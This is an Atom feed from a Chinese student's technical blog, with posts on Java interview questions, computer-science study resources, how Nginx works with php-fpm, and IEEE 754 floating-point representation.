<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>只为不凡而来</title>
  <subtitle>小智的世界</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-04-12T00:57:19.410Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>wuduozhi</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>面试|php常考面试题</title>
    <link href="http://yoursite.com/2018/04/12/%E9%9D%A2%E8%AF%95-php%E5%B8%B8%E8%80%83%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>http://yoursite.com/2018/04/12/面试-php常考面试题/</id>
    <published>2018-04-12T08:57:19.000Z</published>
    <updated>2018-04-12T00:57:19.410Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>面试|Java常考面试题</title>
    <link href="http://yoursite.com/2018/04/12/%E9%9D%A2%E8%AF%95-Java%E5%B8%B8%E8%80%83%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
    <id>http://yoursite.com/2018/04/12/面试-Java常考面试题/</id>
    <published>2018-04-12T08:57:04.000Z</published>
    <updated>2018-04-12T01:08:57.202Z</updated>
    
    <content type="html"><![CDATA[<h3 id="JDK和JRE的区别是什么？"><a href="#JDK和JRE的区别是什么？" class="headerlink" title="JDK和JRE的区别是什么？"></a>JDK和JRE的区别是什么？</h3><p>链接：<a href="https://www.nowcoder.com/questionTerminal/36bd480a52d542298a8ca2056021f774" target="_blank" rel="external">https://www.nowcoder.com/questionTerminal/36bd480a52d542298a8ca2056021f774</a><br>来源：牛客网</p>
<p>JRE： Java Runtime Environment<br>JDK：Java Development Kit<br>JRE顾名思义是java运行时环境，包含了java虚拟机，java基础类库。是使用java语言编写的程序运行所需要的软件环境，是提供给想运行java程序的用户使用的。<br>JDK顾名思义是java开发工具包，是程序员使用java语言编写java程序所需的开发工具包，是提供给程序员使用的。JDK包含了JRE，同时还包含了编译java源码的编译器javac，还包含了很多java程序调试和分析的工具：jconsole，jvisualvm等工具软件，还包含了java程序编写所需的文档和demo例子程序。<br>如果你需要运行java程序，只需安装JRE就可以了。如果你需要编写java程序，需要安装JDK。<br>JRE根据不同操作系统（如：windows，linux等）和不同JRE提供商（IBM,ORACLE等）有很多版本 </p>
<p>再说说java的跨平台吧:<br>java源程序先经过javac编译器编译成二进制的.class字节码文件（java的跨平台指的就是.class字节码文件的跨平台，.class字节码文件是与平台无关的），.class文件再运行在jvm上，java解释器（jvm的一部分）会将其解释成对应平台的机器码执行，所以java所谓的跨平台就是在不同平台上安装了不同的jvm，而在不同平台上生成的.class文件都是一样的，而.class文件再由对应平台的jvm解释成对应平台的机器码执行</p>
<p>最后解释下机器码和字节码的区别:<br> 一，机器码，完全依附硬件而存在～并且不同硬件由于内嵌指令集不同，即使相同的0 1代码<br>意思也可能是不同的～换句话说，根本不存在跨平台性～比如～不同型号的CPU,你给他个指令10001101，他们可能会解析为不同的结果～<br>二，我们知道JAVA是跨平台的，为什么呢？因为他有一个jvm,不论那种硬件，只要你装有jvm,那么他就认识这个JAVA字节码～～～～至于底层的机器码，咱不用管，有jvm搞定，他会把字节码再翻译成所在机器认识的机器码～～～</p>
<h3 id="是否可以在static环境中访问非static变量？"><a href="#是否可以在static环境中访问非static变量？" class="headerlink" title="是否可以在static环境中访问非static变量？"></a>是否可以在static环境中访问非static变量？</h3><p>static变量在Java中是属于类的，它在所有的实例中的值是一样的。当类被Java虚拟机载入的时候，会对static变量进行初始化。如果你的代码尝试不用实例来访问非static的变量，编译器会报错，因为这些变量还没有被创建出来，还没有跟任何实例关联上。</p>
<h3 id="Java支持的数据类型有哪些？什么是自动拆装箱？"><a href="#Java支持的数据类型有哪些？什么是自动拆装箱？" class="headerlink" title="Java支持的数据类型有哪些？什么是自动拆装箱？"></a>Java支持的数据类型有哪些？什么是自动拆装箱？</h3><p>Java语言支持的8种基本数据类型是：</p>
<ul>
<li>byte</li>
<li>short</li>
<li>int</li>
<li>long</li>
<li>float</li>
<li>double</li>
<li>boolean</li>
<li>char</li>
</ul>
<p>自动装箱是Java编译器在基本数据类型和对应的对象包装类型之间做的一个转化。比如：把int转化成Integer，double转化成Double，等等。反之就是自动拆箱。</p>
<p>Java支持的数据类型包括两种：一种是基本数据类型，包含byte，char,short, boolean ,int , long, float,double;另一种是引用类型：如String等，其实是对象的引用，JVM中虚拟栈中存的是对象的地址，创建的对象实质在堆中，通过地址来找到堆中的对象的过程，即为引用类型。自动装箱就是Java编译器在基本数据类型和对应的对象包装类型间的转化，即int转化为Integer,自动拆箱是Integer调用其方法将其转化为int的过程 .</p>
<h3 id="Java支持多继承么？"><a href="#Java支持多继承么？" class="headerlink" title="Java支持多继承么？"></a>Java支持多继承么？</h3><p>Java中类不支持多继承，只支持单继承（即一个类只有一个父类）。 但是java中的接口支持多继承，，即一个子接口可以有多个父接口。（接口的作用是用来扩展对象的功能，一个子接口继承多个父接口，说明子接口扩展了多个功能，当类实现接口时，类就扩展了相应的功能）。 </p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;JDK和JRE的区别是什么？&quot;&gt;&lt;a href=&quot;#JDK和JRE的区别是什么？&quot; class=&quot;headerlink&quot; title=&quot;JDK和JRE的区别是什么？&quot;&gt;&lt;/a&gt;JDK和JRE的区别是什么？&lt;/h3&gt;&lt;p&gt;链接：&lt;a href=&quot;https://ww
    
    </summary>
    
      <category term="面试" scheme="http://yoursite.com/categories/%E9%9D%A2%E8%AF%95/"/>
    
    
      <category term="面试" scheme="http://yoursite.com/tags/%E9%9D%A2%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>计算机算法|我的学习之路</title>
    <link href="http://yoursite.com/2018/04/12/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95-%E6%88%91%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2018/04/12/计算机算法-我的学习之路/</id>
    <published>2018-04-12T00:23:58.000Z</published>
    <updated>2018-04-11T16:50:50.694Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>自己作为一名大二的准CS本科生，正在学习计算机算法这门课，但由于学校开设的课不咋地，同时自己又深知算法的重要性，只能自己另寻出路了。</p>
<h3 id="My-Way"><a href="#My-Way" class="headerlink" title="My Way"></a>My Way</h3><p><a href="http://open.163.com/special/opencourse/algorithms.html" target="_blank" rel="external">网易云-麻省理工公开课</a><br><a href="https://www.bilibili.com/video/av13229392/" target="_blank" rel="external">bliblili-斯坦福公开课</a><br><a href="https://www.coursera.org/specializations/algorithms" target="_blank" rel="external">coursera</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;自己作为一名大二的准CS本科生，正在学习计算机算法这门课，但由于学校开设的课不咋地，同时自己又深知算法的重要性，只能自己另寻出路了。&lt;/p&gt;
    
    </summary>
    
      <category term="计算机算法" scheme="http://yoursite.com/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="计算机算法" scheme="http://yoursite.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95/"/>
    
  </entry>
  
  <entry>
    <title>深入学习计算机系统|我的学习之路</title>
    <link href="http://yoursite.com/2018/04/11/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F-%E6%88%91%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2018/04/11/深入学习计算机系统-我的学习之路/</id>
    <published>2018-04-11T11:43:41.000Z</published>
    <updated>2018-04-11T03:49:20.175Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>自己作为一名大二的准CS本科生，正在学习深入学习计算机系统这门课，但由于学校开设的课不咋地，同时自己又深知底层知识的重要性，只能自己另寻出路了。</p>
<h3 id="My-Way"><a href="#My-Way" class="headerlink" title="My Way"></a>My Way</h3><p><a href="http://www.cnblogs.com/zuoxiaolong/category/518480.html" target="_blank" rel="external">博客教程</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;自己作为一名大二的准CS本科生，正在学习深入学习计算机系统这门课，但由于学校开设的课不咋地，同时自己又深知底层知识的重要性，只能自己另寻出路
    
    </summary>
    
      <category term="深入学习计算机系统" scheme="http://yoursite.com/categories/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="深入学习计算机系统" scheme="http://yoursite.com/tags/%E6%B7%B1%E5%85%A5%E5%AD%A6%E4%B9%A0%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>操作系统|我的学习之路</title>
    <link href="http://yoursite.com/2018/04/11/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F-%E6%88%91%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B9%8B%E8%B7%AF/"/>
    <id>http://yoursite.com/2018/04/11/操作系统-我的学习之路/</id>
    <published>2018-04-11T10:20:12.000Z</published>
    <updated>2018-04-11T03:22:06.058Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><p>自己作为一名大二的准CS本科生，正在学习操作系统这门课，但由于学校开设的课不咋地，同时自己又深知操作系统的重要性，只能自己另寻出路了。</p>
<h3 id="学习之路"><a href="#学习之路" class="headerlink" title="学习之路"></a>学习之路</h3><p>幸运的是自己生在互联网的时代，自己淘到了哈工大的李治军老师主讲的公开课，棒棒的。</p>
<p>课程视频资料:</p>
<p><a href="http://mooc.study.163.com/course/1000002004?tid=1000002003#/info" target="_blank" rel="external">操作系统之基础</a><br><a href="http://mooc.study.163.com/course/1000002008?tid=1000003004#/info" target="_blank" rel="external">操作系统之进程与线程</a><br><a href="http://mooc.study.163.com/course/1000003007?tid=1000003005#/info" target="_blank" rel="external">操作系统之内存管理</a><br><a href="http://mooc.study.163.com/course/1000002009?tid=1000002008#/info" target="_blank" rel="external">操作系统之外设与文件系统</a></p>
<p>哈工大课程实验配套资料:<br><a href="https://www.jianshu.com/p/01774f28b401" target="_blank" rel="external">写在实验之前</a><br><a href="https://github.com/DeathKing/hit-oslab" target="_blank" rel="external">GItHub环境仓库</a><br><a href="https://github.com/hoverwinter/HIT-OSLab" target="_blank" rel="external">GitHub代码</a><br><a href="https://www.kancloud.cn/digest/os-experiment/120076" target="_blank" rel="external">看云实验手册</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;p&gt;自己作为一名大二的准CS本科生，正在学习操作系统这门课，但由于学校开设的课不咋地，同时自己又深知操作系统的重要性，只能自己另寻出路了。&lt;/p
    
    </summary>
    
      <category term="操作系统" scheme="http://yoursite.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
      <category term="操作系统" scheme="http://yoursite.com/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
  </entry>
  
  <entry>
    <title>运维|Nginx+Php-fpm运行原理详解</title>
    <link href="http://yoursite.com/2018/04/09/%E8%BF%90%E7%BB%B4-Nginx+Php-fpm%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86%E8%AF%A6%E8%A7%A3/"/>
    <id>http://yoursite.com/2018/04/09/运维-Nginx+Php-fpm运行原理详解/</id>
    <published>2018-04-09T11:41:10.000Z</published>
    <updated>2018-04-09T08:00:30.042Z</updated>
    
    <content type="html"><![CDATA[<h3 id="代理与反向代理"><a href="#代理与反向代理" class="headerlink" title="代理与反向代理"></a>代理与反向代理</h3><p>现实生活中的例子<br>1、正向代理：访问google.com</p>
<p><img src="/images/Nginx+Php-fpm运行原理详解01.png" alt="正向代理" title="Nginx+Php-fpm运行原理详解01"></p>
<p>如上图，因为google被墙，我们需要vpn翻墙才能访问google.com。</p>
<blockquote>
<p>vpn对于“我们”来说，是可以感知到的（我们连接vpn）<br>vpn对于”google服务器”来说，是不可感知的(google只知道有http请求过来)。</p>
</blockquote>
<p>对于人来说可以感知到，但服务器感知不到的服务器，我们叫他正向代理服务器。</p>
<p>2、反向代理：通过反向代理实现负载均衡</p>
<p><img src="/images/Nginx+Php-fpm运行原理详解02.png" alt="反向代理" title="Nginx+Php-fpm运行原理详解02"></p>
<p>如上图，我们访问baidu.com的时候，baidu有一个代理服务器，通过这个代理服务器，可以做负载均衡，路由到不同的server。</p>
<blockquote>
<p>此代理服务器,对于“我们”来说是不可感知的(我们只能感知到访问的是百度的服务器，不知道中间还有代理服务器来做负载均衡)。</p>
</blockquote>
<p>此代理服务器，对于”server1 server2 server3”是可感知的(代理服务器负载均衡路由到不同的server)<br>对于人来说不可感知，但对于服务器来说是可以感知的，我们叫他反向代理服务器</p>
<p>总结<br>说白了：“正向”、“反向”是相对于人的感知来说的。<br>人能感受到的代理就是正向代理，人感受不到的代理就是反向代理。</p>
<h3 id="初识Nginx与Php-fpm"><a href="#初识Nginx与Php-fpm" class="headerlink" title="初识Nginx与Php-fpm"></a>初识Nginx与Php-fpm</h3><h4 id="Nginx是什么"><a href="#Nginx是什么" class="headerlink" title="Nginx是什么"></a>Nginx是什么</h4><p>Nginx (“engine x”) 是一个高性能的HTTP和反向代理服务器，也是一个IMAP/POP3/SMTP服务器。</p>
<h4 id="Php-fpm是什么"><a href="#Php-fpm是什么" class="headerlink" title="Php-fpm是什么"></a>Php-fpm是什么</h4><h5 id="cgi、fast-cgi协议"><a href="#cgi、fast-cgi协议" class="headerlink" title="cgi、fast-cgi协议"></a>cgi、fast-cgi协议</h5><p>cgi的历史<br>早期的webserver只处理html等静态文件，但是随着技术的发展，出现了像php等动态语言。<br>webserver处理不了了，怎么办呢？那就交给php解释器来处理吧！<br>交给php解释器处理很好，但是，php解释器如何与webserver进行通信呢？</p>
<p>为了解决不同的语言解释器(如php、python解释器)与webserver的通信，于是出现了cgi协议。只要你按照cgi协议去编写程序，就能实现语言解释器与webwerver的通信。如php-cgi程序。</p>
<p>fast-cgi的改进<br>有了cgi协议，解决了php解释器与webserver通信的问题，webserver终于可以处理动态语言了。<br>但是，webserver每收到一个请求，都会去fork一个cgi进程，请求结束再kill掉这个进程。这样有10000个请求，就需要fork、kill php-cgi进程10000次。</p>
<p>有没有发现很浪费资源？</p>
<p>于是，出现了cgi的改良版本，fast-cgi。fast-cgi每次处理完请求后，不会kill掉这个进程，而是保留这个进程，使这个进程可以一次处理多个请求。这样每次就不用重新fork一个进程了，大大提高了效率。</p>
<h5 id="php-fpm是什么"><a href="#php-fpm是什么" class="headerlink" title="php-fpm是什么"></a>php-fpm是什么</h5><p>php-fpm即php-Fastcgi Process Manager.<br>php-fpm是 FastCGI 的实现，并提供了进程管理的功能。<br>进程包含 master 进程和 worker 进程两种进程。<br>master 进程只有一个，负责监听端口，接收来自 Web Server 的请求，而 worker 进程则一般有多个(具体数量根据实际需要配置)，每个进程内部都嵌入了一个 PHP 解释器，是 PHP 代码真正执行的地方。</p>
<h3 id="Nginx如何与Php-fpm结合"><a href="#Nginx如何与Php-fpm结合" class="headerlink" title="Nginx如何与Php-fpm结合"></a>Nginx如何与Php-fpm结合</h3><p>上面我们说了，Nginx不只有处理http请求的功能，还能做反向代理。<br>Nginx通过反向代理功能将动态请求转向后端Php-fpm。</p>
<p>下面我们来配置一个全新的Nginx+Php-fpm</p>
<ol>
<li>配置nginx.conf文件</li>
</ol>
<p>进入nginx目录下，编辑 nginx.conf文件。<br>如图，在nginx.conf最后一行，添加include文件</p>
<p><img src="/images/Nginx+Php-fpm运行原理详解03.png" alt="How -1" title="Nginx+Php-fpm运行原理详解03"></p>
<ol>
<li>添加对应的server<br>进入上面include的路径，添加一个server</li>
</ol>
<p><img src="/images/Nginx+Php-fpm运行原理详解04.png" alt="添加server" title="Nginx+Php-fpm运行原理详解04"></p>
<p>下面我们解释一下配置项的含义：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">server &#123;</div><div class="line">    listen       80; #监听80端口，接收http请求</div><div class="line">    server_name  www.example.com; #就是网站地址</div><div class="line">    root /usr/local/etc/nginx/www/huxintong_admin; # 准备存放代码工程的路径</div><div class="line">    #路由到网站根目录www.example.com时候的处理</div><div class="line">    location / &#123;</div><div class="line">        index index.php; #跳转到www.example.com/index.php</div><div class="line">        autoindex on;</div><div class="line">    &#125;   </div><div class="line"></div><div class="line">    #当请求网站下php文件的时候，反向代理到php-fpm</div><div class="line">    location ~ \.php$ &#123;</div><div class="line">        include /usr/local/etc/nginx/fastcgi.conf; #加载nginx的fastcgi模块</div><div class="line">        fastcgi_intercept_errors on;</div><div class="line">        fastcgi_pass   127.0.0.1:9000; #nginx fastcgi进程监听的IP地址和端口</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>总而言之：当我们访问www.example.com的时候，处理流程是这样的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">  www.example.com</div><div class="line">        |</div><div class="line">        |</div><div class="line">      Nginx</div><div class="line">        |</div><div class="line">        |</div><div class="line">路由到www.example.com/index.php</div><div class="line">        |</div><div class="line">        |</div><div class="line">加载nginx的fast-cgi模块</div><div class="line">        |</div><div class="line">        |</div><div class="line">fast-cgi监听127.0.0.1:9000地址</div><div class="line">        |</div><div class="line">        |</div><div class="line">www.example.com/index.php请求到达127.0.0.1:9000</div><div class="line">        |</div><div class="line">        |</div><div class="line">     等待处理...</div></pre></td></tr></table></figure>
<p>下面我们启用php的php-fpm来处理这个请求</p>
<p>打开php-fpm.conf文件，我们看到如下配置：</p>
<p><img src="/images/Nginx+Php-fpm运行原理详解05.png" alt="php-fpm" title="Nginx+Php-fpm运行原理详解05"></p>
<blockquote>
<p>即:php-fpm模块监听127.0.0.1:9000端口，等待请求到来去处理。</p>
</blockquote>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>nginx与php-fpm的结合，完整的流程是这样的。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"> www.example.com</div><div class="line">        |</div><div class="line">        |</div><div class="line">      Nginx</div><div class="line">        |</div><div class="line">        |</div><div class="line">路由到www.example.com/index.php</div><div class="line">        |</div><div class="line">        |</div><div class="line">加载nginx的fast-cgi模块</div><div class="line">        |</div><div class="line">        |</div><div class="line">fast-cgi监听127.0.0.1:9000地址</div><div class="line">        |</div><div class="line">        |</div><div class="line">www.example.com/index.php请求到达127.0.0.1:9000</div><div class="line">        |</div><div class="line">        |</div><div class="line">php-fpm 监听127.0.0.1:9000</div><div class="line">        |</div><div class="line">        |</div><div class="line">php-fpm 接收到请求，启用worker进程处理请求</div><div class="line">        |</div><div class="line">        |</div><div class="line">php-fpm 处理完请求，返回给nginx</div><div class="line">        |</div><div class="line">        |</div><div class="line">nginx将结果通过http返回给浏览器</div></pre></td></tr></table></figure>
<p><img src="/images/Nginx+Php-fpm运行原理详解06.png" alt="运行原理" title="Nginx+Php-fpm运行原理详解06"></p>
<h3 id="一些问题"><a href="#一些问题" class="headerlink" title="一些问题"></a>一些问题</h3><h4 id="反向代理和负载均衡是什么关系"><a href="#反向代理和负载均衡是什么关系" class="headerlink" title="反向代理和负载均衡是什么关系"></a>反向代理和负载均衡是什么关系</h4><p>反向代理和负载均衡这两个词经常出现在一起，但他们实际上是不同的概念，负载均衡它更多的是强调的是一种算法或策略，将请求分布到不同的机器上，因此实际上也起到了反向代理的作用。</p>
<h4 id="proxy-pass-和-fastcgi-pass-的区别"><a href="#proxy-pass-和-fastcgi-pass-的区别" class="headerlink" title="proxy_pass 和 fastcgi_pass 的区别"></a>proxy_pass 和 fastcgi_pass 的区别</h4><p>一个是反向代理模块，一个是转发给 factcgi 后端处理。</p>
<p><img src="/images/Nginx+Php-fpm运行原理详解07.png" alt="proxy_pass 和 fastcgi_pass 的区别" title="Nginx+Php-fpm运行原理详解07"></p>
<p><a href="https://segmentfault.com/a/1190000010443248" target="_blank" rel="external">阿里云服务器CentOS7.0安装Nginx 1.12.1</a><br><a href="http://www.cnblogs.com/freeweb/p/5425554.html" target="_blank" rel="external">Linux下安装php环境并且配置Nginx支持php-fpm模块</a><br><a href="https://www.jianshu.com/p/495a02eb2672" target="_blank" rel="external">CentOS7搭建配置Nginx+PHP+MySQL</a><br><a href="https://segmentfault.com/a/1190000007322358" target="_blank" rel="external">nginx与php-fpm关系大揭秘</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;代理与反向代理&quot;&gt;&lt;a href=&quot;#代理与反向代理&quot; class=&quot;headerlink&quot; title=&quot;代理与反向代理&quot;&gt;&lt;/a&gt;代理与反向代理&lt;/h3&gt;&lt;p&gt;现实生活中的例子&lt;br&gt;1、正向代理：访问google.com&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/
    
    </summary>
    
      <category term="运维" scheme="http://yoursite.com/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
      <category term="运维" scheme="http://yoursite.com/tags/%E8%BF%90%E7%BB%B4/"/>
    
  </entry>
  
  <entry>
    <title>浮点数的二进制表示</title>
    <link href="http://yoursite.com/2018/04/09/%E6%B5%AE%E7%82%B9%E6%95%B0%E7%9A%84%E4%BA%8C%E8%BF%9B%E5%88%B6%E8%A1%A8%E7%A4%BA/"/>
    <id>http://yoursite.com/2018/04/09/浮点数的二进制表示/</id>
    <published>2018-04-08T16:38:58.000Z</published>
    <updated>2018-04-10T09:04:54.565Z</updated>
    
    <content type="html"><![CDATA[<h3 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line"></div><div class="line">　　void main(void)&#123;</div><div class="line"></div><div class="line">　　　　int num=9; /* num是整型变量，设为9 */</div><div class="line"></div><div class="line">　　　　float* pFloat=&amp;num; /* pFloat表示num的内存地址，但是设为浮点数 */</div><div class="line"></div><div class="line">　　　　printf(&quot;num的值为：%d\n&quot;,num); /* 显示num的整型值 */</div><div class="line"></div><div class="line">　　　　printf(&quot;*pFloat的值为：%f\n&quot;,*pFloat); /* 显示num的浮点值 */</div><div class="line"></div><div class="line">　　　　*pFloat=9.0; /* 将num的值改为浮点数 */</div><div class="line"></div><div class="line">　　　　printf(&quot;num的值为：%d\n&quot;,num); /* 显示num的整型值 */</div><div class="line"></div><div class="line">　　　　printf(&quot;*pFloat的值为：%f\n&quot;,*pFloat); /* 显示num的浮点值 */</div><div class="line"></div><div class="line">　　&#125;</div></pre></td></tr></table></figure>
<p>大家知道程序运行的结果是什么嘛？</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">num的值为：9</div><div class="line">*pFloat的值为：0.000000</div><div class="line">num的值为：1091567616</div><div class="line">*pFloat的值为：9.000000</div></pre></td></tr></table></figure>
<p>我很惊讶，num和*pFloat在内存中明明是同一个数，为什么浮点数和整数的解读结果会差别这么大？</p>
<p>要理解这个结果，一定要搞懂浮点数在计算机内部的表示方法。我读了一些资料，下面就是我的笔记。</p>
<h3 id="int的表示"><a href="#int的表示" class="headerlink" title="int的表示"></a>int的表示</h3><p>在讨论浮点数之前，先看一下整数在计算机内部是怎样表示的。<br><code>int num=9;</code></p>
<p>上面这条命令，声明了一个整数变量，类型为int，值为9（二进制写法为1001）。普通的32位计算机，用4个字节表示int变量，所以9就被保存为00000000 00000000 00000000 00001001，写成16进制就是0x00000009。</p>
<p>那么，我们的问题就简化成：为什么0x00000009还原成浮点数，就成了0.000000？</p>
<h3 id="IEEE标准"><a href="#IEEE标准" class="headerlink" title="IEEE标准"></a>IEEE标准</h3><p>根据国际标准IEEE 754，任意一个二进制浮点数V可以表示成下面的形式：</p>
<p><img src="/images/浮点数的二进制表示01.png" alt="IEEE754" title="浮点数的二进制表示01"></p>
<p>举例来说，十进制的5.0，写成二进制是101.0，相当于1.01×2^2。那么，按照上面V的格式，可以得出s=0，M=1.01，E=2。</p>
<p>十进制的-5.0，写成二进制是-101.0，相当于-1.01×2^2。那么，s=1，M=1.01，E=2。</p>
<p>IEEE 754规定，对于32位的浮点数，最高的1位是符号位s，接着的8位是指数E，剩下的23位为有效数字M。</p>
<p><img src="/images/浮点数的二进制表示02.png" alt="32bit" title="浮点数的二进制表示02"></p>
<p>对于64位的浮点数，最高的1位是符号位S，接着的11位是指数E，剩下的52位为有效数字M。</p>
<p><img src="/images/浮点数的二进制表示03.png" alt="64bit" title="浮点数的二进制表示03"></p>
<p>IEEE 754对有效数字M和指数E，还有一些特别规定。</p>
<p>前面说过，1≤M&lt;2，也就是说，M可以写成1.xxxxxx的形式，其中xxxxxx表示小数部分。IEEE 754规定，在计算机内部保存M时，默认这个数的第一位总是1，因此可以被舍去，只保存后面的xxxxxx部分。比如保存1.01的时候，只保存01，等到读取的时候，再把第一位的1加上去。这样做的目的，是节省1位有效数字。以32位浮点数为例，留给M只有23位，将第一位的1舍去以后，等于可以保存24位有效数字。</p>
<p>至于指数E，情况就比较复杂。</p>
<p>首先，E为一个无符号整数（unsigned int）。这意味着，如果E为8位，它的取值范围为0~255；如果E为11位，它的取值范围为0~2047。但是，我们知道，科学计数法中的E是可以出现负数的，所以IEEE 754规定，E的真实值必须再减去一个中间数，对于8位的E，这个中间数是127；对于11位的E，这个中间数是1023。</p>
<p>比如，2^10的E是10，所以保存成32位浮点数时，必须保存成10+127=137，即10001001。</p>
<p>然后，指数E还可以再分成三种情况：</p>
<p>（1）E不全为0或不全为1。这时，浮点数就采用上面的规则表示，即指数E的计算值减去127（或1023），得到真实值，再将有效数字M前加上第一位的1。</p>
<p>（2）E全为0。这时，浮点数的指数E等于1-127（或者1-1023），有效数字M不再加上第一位的1，而是还原为0.xxxxxx的小数。这样做是为了表示±0，以及接近于0的很小的数字。</p>
<p>（3）E全为1。这时，如果有效数字M全为0，表示±无穷大（正负取决于符号位s）；如果有效数字M不全为0，表示这个数不是一个数（NaN）。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div c
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>工具|Dos下的debug工具使用</title>
    <link href="http://yoursite.com/2018/04/01/%E5%B7%A5%E5%85%B7-Dos%E4%B8%8B%E7%9A%84debug%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/"/>
    <id>http://yoursite.com/2018/04/01/工具-Dos下的debug工具使用/</id>
    <published>2018-04-01T00:04:11.000Z</published>
    <updated>2018-04-03T01:30:19.958Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Dubug是dos,windows下提供的调试工具，使用该工具，可以查看和修改寄存器，内存的内容。同时可以在机器码级别跟踪程序源码的运行。</p>
